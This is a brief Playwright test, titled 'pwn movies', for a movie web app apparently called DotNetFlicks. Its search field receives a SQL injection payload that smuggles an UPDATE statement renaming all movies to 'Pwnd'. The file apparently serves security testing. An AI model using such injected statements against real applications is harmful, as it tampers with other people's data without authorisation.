import { test, expect } from '@playwright/test';

test.use({ storageState: './tmp/admin.json' })
test.describe('manage movies', () => {
  test('pwn movies', async ({ page }) => {
    await page.goto('/Movie');

    await page.locator('[placeholder="Search"]').fill('\'); UPDATE Movies SET NAME = \'Pwnd\'--');
    await page.locator('.input-group-append > .btn').click();

    await expect(page).toHaveTitle('Movies - DotNetFlicks');
  })
});